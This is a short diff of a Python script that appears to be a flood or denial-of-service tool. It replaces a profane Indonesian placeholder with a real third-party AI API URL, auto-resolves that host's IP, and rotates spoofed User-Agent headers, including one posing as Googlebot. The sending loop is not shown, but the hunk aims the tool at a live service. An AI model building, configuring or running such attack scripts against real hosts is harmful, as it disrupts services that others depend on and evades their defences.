@@ -4,7 +4,7 @@ import socket
 import random
 import time
 
-target_url = "TARO_URL_TARGET_SINI_BANGSAT"  # GANTI INI, JANGAN BEBAL!
+target_url = "https://api.deline.my.id/ai/copilot?text=Sekarang+hari+apa"  # GANTI INI, JANGAN BEBAL!
 target_ip = socket.gethostbyname(target_url.split("//")[-1].split("/")[0].split(":")[0])  # AUTO DETECT IP
 fake_headers = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}, 
                 {'User-Agent': 'Googlebot'}, 
